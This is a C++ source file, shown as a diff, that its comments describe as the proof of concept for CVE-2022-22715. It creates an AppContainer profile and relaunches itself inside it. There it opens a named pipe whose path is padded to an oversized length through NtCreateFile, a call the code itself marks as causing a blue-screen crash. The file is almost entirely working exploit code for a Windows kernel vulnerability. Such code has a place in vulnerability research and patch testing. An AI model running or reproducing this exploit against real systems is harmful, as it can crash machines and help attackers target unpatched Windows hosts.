@@ -1,0 +1,124 @@
+//启动AppContainer环境的进程 此代码也是CVE-2022-22715的poc
+
+#include <string>
+#include <string.h>
+#include <windows.h>
+#include <strsafe.h>
+#include <tlhelp32.h>
+#include <inspectable.h>
+#include <windef.h>
+#include <Psapi.h>
+#include <sddl.h>
+#include <userenv.h>
+#include <winternl.h>
+#pragma comment(lib, "ntdll")
+#pragma warning(disable:4996)
+#pragma comment(lib, "Userenv.lib")
+
+extern "C" int NTAPI NtQueryInformationToken(
+	 HANDLE                  TokenHandle,
+	 TOKEN_INFORMATION_CLASS TokenInformationClass,
+	 PVOID                   TokenInformation,
+	 ULONG                   TokenInformationLength,
+	 PULONG                  ReturnLength
+);
+
+
+int main() {
+
+
+	PROCESS_INFORMATION pi = { 0 };
+	STARTUPINFOEXA si = { sizeof(si) };
+	SIZE_T sizeToAllocate;
+	char* pEnd = NULL;
+
+	HANDLE token;
+	OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &token);
+	DWORD is;
+	ULONG ret;
+	NtQueryInformationToken(token, TokenIsAppContainer, &is, 4, &ret);
+
+	if (!is)
+	{
+
+		InitializeProcThreadAttributeList(NULL, 1, 0, &sizeToAllocate);
+
+		si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeToAllocate);
+		InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &sizeToAllocate);
+		
+		
+		SECURITY_CAPABILITIES  securityCapabilities = { 0 };
+
+		PSID m_pSidAppContainer ={ 0 };
+		DeleteAppContainerProfile(L"1");
+		CreateAppContainerProfile(L"1", L"DisplayName", L"Description", 0, 0, &m_pSidAppContainer);
+
+		securityCapabilities.AppContainerSid = m_pSidAppContainer;
+
+		if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_SECURITY_CAPABILITIES,
+			&securityCapabilities, sizeof(securityCapabilities), NULL, NULL))
+		{
+			fprintf(stderr, "UpdateProcThreadAttribute failed");
+			return 1;
+		}
+		char szModule[MAX_PATH];
+		GetModuleFileNameA(NULL, szModule, MAX_PATH);
+		BOOL success = CreateProcessA(
+			NULL, 
+			(LPSTR)szModule,
+			nullptr, nullptr, FALSE,
+			EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, nullptr, nullptr,
+			(LPSTARTUPINFOA)&si,
+			&pi
+		);
+
+		if (!success)
+		{
+			printf("Creating processerror %d\n",GetLastError());
+		}
+		else
+		{
+			printf("Creating process ok \n");
+		}
+	}
+	else
+	{
+		
+		HANDLE hDriver;
+
+		UNICODE_STRING		us;
+
+		WCHAR str[0x10000] = { 0 };
+		WCHAR name[0x10000] = { 0 };
+		memset(str, 0x41, 0x10000);
+		wcscat(name, L"\\Device\\NamedPipe\\LOCAL\\");
+		wcscat(name, str);
+		name[0xffff / 2 - 100 - 10 - 6] = L'\0';
+		RtlInitUnicodeString(&us, name);
+
+		OBJECT_ATTRIBUTES	oa = { 0 };
+
+		InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+		IO_STATUS_BLOCK p;
+
+		NtCreateFile(&hDriver, MAXIMUM_ALLOWED, &oa, &p, NULL, FILE_ATTRIBUTE_NORMAL,
+			NULL, FILE_OPEN_IF, 0, 0, 0);  //BSOD
+
+		if (hDriver == INVALID_HANDLE_VALUE) {
+			printf("CreateFile error %d\n", GetLastError()); //完整性low或以上运行
+		}
+		else
+		{
+			printf("patch this vulnerability\n");
+		}
+		
+	}
+	
+	getchar();
+
+	return 0;
+}
+
+
+
